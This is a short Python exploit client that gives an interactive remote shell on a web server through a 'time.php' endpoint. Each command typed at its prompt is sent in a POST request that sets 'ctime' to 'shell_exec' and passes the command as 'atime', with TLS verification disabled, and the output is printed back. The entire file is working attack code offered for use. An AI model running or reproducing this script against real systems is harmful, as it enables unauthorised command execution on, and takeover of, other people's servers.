#!/usr/bin/env python3
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = str(input("Target URL - time.php: "))

print("+----------------------------------------------------------------------------------------------------+")
print("| Exit-Shortcut: CTRL + C")
print("| Target:       ", target_url)
print("|")
print("| Waiting for shell-commands...")
print("+----------------------------------------------------------------------------------------------------+")

while True:
    try:
        command = input("# ")
        parameters = {"ctime": "shell_exec", "atime": str(command)}
        r = requests.post(target_url, data=parameters, verify=False)
        print(r.text)
        
    except EOFError:
        print(" ")
        print(" ")
        print("Shell closed!")
        break
